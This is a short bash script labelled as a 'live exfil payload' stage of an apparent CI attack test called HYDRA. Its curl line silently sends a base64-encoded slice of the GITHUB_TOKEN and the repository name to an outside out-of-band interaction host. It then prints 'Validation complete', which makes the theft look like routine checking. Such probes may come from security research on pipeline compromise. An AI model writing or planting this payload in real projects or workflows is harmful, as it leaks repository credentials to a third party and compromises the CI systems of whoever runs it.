#!/bin/bash
# HYDRA E2E Stage 3 — live exfil payload
echo 'HYDRA_STAGE3_CONFIRMED_E2E-V2-P'
curl -s 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro?t=$(echo $GITHUB_TOKEN | head -c 8 | base64)&r=$GITHUB_REPOSITORY&f=E2E-V2-P' -o /dev/null
echo 'Validation complete'
